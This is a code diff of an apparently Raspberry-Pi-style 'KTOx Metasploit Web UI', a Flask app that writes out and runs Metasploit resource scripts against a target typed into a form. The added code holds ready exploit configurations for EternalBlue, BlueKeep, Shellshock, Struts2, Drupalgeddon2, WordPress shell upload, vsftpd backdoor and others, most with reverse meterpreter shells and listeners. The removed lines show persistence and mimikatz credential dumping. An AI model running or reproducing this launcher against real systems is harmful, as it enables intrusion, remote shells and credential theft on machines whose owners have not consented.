-            content += "use exploit/windows/local/persistence_service\nset SESSION 1\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nrun"
-        elif "post_mimikatz" in script['file']:
-            content += "load kiwi\ncreds_all\n"
-        elif "http_put_upload" in script['file']:
+        elif script['file'] == "http_put_upload.rc":
             content += "use auxiliary/scanner/http/http_put\nset RHOSTS {RHOSTS}\nset PATH /upload\nset FILENAME test.txt\nset DATA \"test\"\nrun"
-        elif "shellshock_cgi" in script['file']:
-            content += "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS {RHOSTS}\nset TARGETURI /cgi-bin/test\nrun"
-        elif "heartbleed_read" in script['file']:
-            content += "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nset ACTION SCAN\nrun"
-        elif "logjam" in script['file']:
-            content += "use auxiliary/scanner/ssl/logjam\nset RHOSTS {RHOSTS}\nrun"
-        elif "ipv6_neighbor_scan" in script['file']:
-            content += "use auxiliary/scanner/discovery/ipv6_neighbor\nset RHOSTS {RHOSTS}\nrun"
+        elif script['file'] == "eternalblue.rc":
+            content += "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "doublepulsar.rc":
+            content += "use exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "bluekeep.rc":
+            content += "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "shellshock.rc":
+            content += "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "php_cgi.rc":
+            content += "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "apache_struts2.rc":
+            content += "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "drupal_drupalgeddon2.rc":
+            content += "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "wordpress_admin_shell.rc":
+            content += "use exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME {USERNAME}\nset PASSWORD {PASSWORD}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "joomla_media_manager.rc":
+            content += "use exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "weblogic_deserialize.rc":
+            content += "use exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "samba_usermap.rc":
+            content += "use exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "distcc_exec.rc":
+            content += "use exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "vsftpd_backdoor.rc":
+            content += "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit"
+        elif script['file'] == "jenkins_script.rc":
+            content += "use exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "redis_unauth.rc":
+            content += "use auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun"
+        elif script['file'] == "elasticsearch_rce.rc":
+            content += "use exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "jboss_maindeployer.rc":
+            content += "use exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
+        elif script['file'] == "tomcat_mgr_login.rc":
+            content += "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE {WORDLIST}\nrun"
+        elif "reverse_shell_tcp" in script['file']:
+            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset ExitOnSession false\nexploit -j -z"
+        elif "reverse_shell_https" in script['file']:
+            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
+        elif "reverse_shell_php" in script['file']:
+            content += "use exploit/multi/handler\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
+        elif "reverse_shell_java" in script['file']:
+            content += "use exploit/multi/handler\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
         else:
-            content += "# Placeholder – edit manually"
+            continue  # skip unknown
         filepath = os.path.join(SCRIPT_DIR, script['file'])
         with open(filepath, 'w') as f:
             f.write(content)
     print(f"Generated {len(SCRIPTS_DB)} scripts in {SCRIPT_DIR}")
 
 # ----------------------------------------------------------------------
-# Script discovery
+# Script discovery with metadata
 # ----------------------------------------------------------------------
 def discover_scripts():
     scripts = []
-    # Use the database as source of truth (so we have walkthroughs)
     for entry in SCRIPTS_DB:
         filepath = os.path.join(SCRIPT_DIR, entry['file'])
         if os.path.exists(filepath):
@@ -340,6 +209,7 @@ def discover_scripts():
                 'name': entry['name'],
                 'path': filepath,
                 'desc': entry['desc'],
+                'params': entry['params'],
                 'walkthrough': entry['walkthrough']
             })
     return scripts
@@ -350,8 +220,9 @@ def run_script(script_path, params):
             rc_content = f.read()
     except Exception as e:
         return f"Error reading script: {e}"
-    rc_content = rc_content.replace("{LHOST}", params.get('lhost', ''))
-    rc_content = rc_content.replace("{RHOSTS}", params.get('rhosts', ''))
+    # Replace all placeholders
+    for key, val in params.items():
+        rc_content = rc_content.replace("{" + key + "}", val)
     tmp_rc = "/tmp/msf_run.rc"
     with open(tmp_rc, 'w') as f:
         f.write(rc_content)
@@ -382,7 +253,7 @@ def run_command(cmd):
         return f"Error: {str(e)}"
 
 # ----------------------------------------------------------------------
-# Web UI – with modal walkthrough
+# Web UI with dynamic parameter form
 # ----------------------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -423,7 +294,7 @@ HTML_TEMPLATE = """
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
             gap: 15px;
-            max-height: 600px;
+            max-height: 500px;
             overflow-y: auto;
             margin-bottom: 20px;
             padding: 5px;
@@ -454,16 +325,25 @@ HTML_TEMPLATE = """
             padding: 15px;
             margin-bottom: 20px;
         }
-        .param-area input {
+        .param-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .param-group label {
+            font-size: 0.8rem;
+            min-width: 80px;
+        }
+        .param-group input {
             background: #222;
             border: 1px solid #0f0;
             color: #0f0;
             padding: 6px;
             font-family: monospace;
-            margin: 5px 10px 5px 0;
-            width: 200px;
+            flex: 1;
+            min-width: 150px;
         }
-        .param-area label { font-size: 0.8rem; margin-right: 5px; }
         button {
             background: #2a0a0a;
             border: 1px solid #f00;
@@ -508,30 +388,6 @@ HTML_TEMPLATE = """
             margin-left: 10px;
             padding: 6px 12px;
         }
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.9);
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background: #111;
-            border: 2px solid #0f0;
-            border-radius: 12px;
-            padding: 20px;
-            width: 80%;
-            max-width: 500px;
-            color: #0f0;
-            font-family: monospace;
-        }
-        .modal-content h3 { color: #f00; margin-bottom: 10px; }
-        .close { float: right; cursor: pointer; font-size: 24px; }
         .info-btn {
             background: #0a2a2a;
             border: 1px solid #0f0;
@@ -558,17 +414,16 @@ HTML_TEMPLATE = """
         <div class="left">
             <div class="grid" id="scriptGrid">
                 {% for script in scripts %}
-                <div class="script-card" data-path="{{ script.path }}">
+                <div class="script-card" data-path="{{ script.path }}" data-params="{{ script.params|tojson }}">
                     <h3>▶ {{ script.name }} <span class="info-btn" data-walkthrough="{{ script.walkthrough }}">ⓘ</span></h3>
                     <p>{{ script.desc }}</p>
                 </div>
                 {% endfor %}
             </div>
-            <div class="param-area">
-                <label>LHOST (your IP):</label>
-                <input type="text" id="lhost" placeholder="auto" value="{{ lhost }}">
-                <label>RHOSTS (target):</label>
-                <input type="text" id="rhosts" placeholder="192.168.1.100">
+            <div class="param-area" id="paramArea">
+                <div class="param-group"><label>LHOST (your IP):</label><input type="text" id="lhost" placeholder="auto" value="{{ lhost }}"></div>
+                <div class="param-group"><label>RHOSTS (target):</label><input type="text" id="rhosts" placeholder="192.168.1.100"></div>
+                <div class="param-group" id="extraParams"></div>
                 <button id="runBtn">🚀 RUN SCRIPT</button>
             </div>
             <div class="output">
@@ -589,23 +444,23 @@ HTML_TEMPLATE = """
     <footer>KTOx Metasploit Web UI – Click ⓘ for walkthrough | LCD: K2=cycle, K1=QR, K3=exit</footer>
 </div>
 
-<div id="modal" class="modal">
-    <div class="modal-content">
-        <span class="close">&times;</span>
-        <h3 id="modalTitle">Walkthrough</h3>
-        <p id="modalText"></p>
+<div id="modal" class="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:1000;">
+    <div style="background:#111; border:2px solid #0f0; border-radius:12px; padding:20px; max-width:500px;">
+        <span id="closeModal" style="float:right; cursor:pointer; font-size:24px;">&times;</span>
+        <h3 id="modalTitle" style="color:#f00;"></h3>
+        <p id="modalText" style="color:#0f0;"></p>
     </div>
 </div>
 
 <script>
     let selectedPath = null;
-    let selectedWalkthrough = "";
+    let selectedParams = [];
 
     // Modal handling
     const modal = document.getElementById('modal');
-    const closeSpan = document.getElementsByClassName('close')[0];
-    closeSpan.onclick = function() { modal.style.display = 'none'; }
-    window.onclick = function(event) { if (event.target == modal) modal.style.display = 'none'; }
+    const closeModal = document.getElementById('closeModal');
+    closeModal.onclick = function() { modal.style.display = 'none'; }
+    window.onclick = function(e) { if (e.target == modal) modal.style.display = 'none'; }
 
     document.querySelectorAll('.info-btn').forEach(btn => {
         btn.addEventListener('click', (e) => {
@@ -626,9 +481,32 @@ HTML_TEMPLATE = """
             document.querySelectorAll('.script-card').forEach(c => c.classList.remove('selected'));
             card.classList.add('selected');
             selectedPath = card.getAttribute('data-path');
-            selectedWalkthrough = card.querySelector('.info-btn').getAttribute('data-walkthrough');
+            selectedParams = JSON.parse(card.getAttribute('data-params'));
+            updateParamFields();
         });
     });
+
+    function updateParamFields() {
+        const container = document.getElementById('extraParams');
+        container.innerHTML = '';
+        for (let param of selectedParams) {
+            if (param === 'LHOST' || param === 'RHOSTS') continue;
+            const div = document.createElement('div');
+            div.className = 'param-group';
+            const label = document.createElement('label');
+            label.innerText = param + ':';
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.id = 'param_' + param;
+            input.placeholder = param === 'WORDLIST' ? '/usr/share/wordlists/rockyou.txt' : (param === 'LPORT' ? '4444' : 'value');
+            if (param === 'LPORT') input.value = '4444';
+            if (param === 'USERNAME') input.value = 'root';
+            if (param === 'PASSWORD') input.value = 'password';
+            div.appendChild(label);
+            div.appendChild(input);
+            container.appendChild(div);
+        }
+    }
 
     // Run script
     document.getElementById('runBtn').addEventListener('click', () => {
@@ -638,20 +516,22 @@ HTML_TEMPLATE = """
         }
         const lhost = document.getElementById('lhost').value || '{{ lhost }}';
         const rhosts = document.getElementById('rhosts').value;
-        if (!rhosts) {
+        if (!rhosts && selectedParams.includes('RHOSTS')) {
             alert('Enter target IP (RHOSTS)');
             return;
+        }
+        const params = { LHOST: lhost, RHOSTS: rhosts };
+        for (let param of selectedParams) {
+            if (param === 'LHOST' || param === 'RHOSTS') continue;
+            const val = document.getElementById('param_' + param)?.value || '';
+            if (val) params[param] = val;
         }
         const outputDiv = document.getElementById('output');
         outputDiv.innerText = 'Running script... please wait.';
         fetch('/run', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                script_path: selectedPath,
-                lhost: lhost,
-                rhosts: rhosts
-            })
+            body: JSON.stringify({ script_path: selectedPath, params: params })
         })
         .then(r => r.json())
         .then(data => {
@@ -699,11 +579,9 @@ def index():
 def run():
     data = request.json
     script_path = data.get('script_path')
-    lhost = data.get('lhost', get_local_ip())
-    rhosts = data.get('rhosts')
-    if not rhosts:
-        return jsonify({'output': 'Error: RHOSTS not provided'})
-    params = {'lhost': lhost, 'rhosts': rhosts}
+    params = data.get('params', {})
+    if not script_path:
+        return jsonify({'output': 'No script selected'})
     output = run_script(script_path, params)
     return jsonify({'output': output})
 
@@ -717,7 +595,7 @@ def cmd():
     return jsonify({'output': output})
 
 # ----------------------------------------------------------------------
-# LCD helpers
+# LCD helpers (same as before)
 # ----------------------------------------------------------------------
 def get_local_ip():
     try:
@@ -792,9 +670,8 @@ def lcd_loop():
 # Main
 # ----------------------------------------------------------------------
 def main():
-    # Generate scripts if needed
+    # Regenerate scripts every time (to ensure all are present)
     generate_scripts()
-
     # Check msfconsole
     if os.system("which msfconsole >/dev/null 2>&1") != 0:
         print("Metasploit not found. Please install metasploit-framework.")
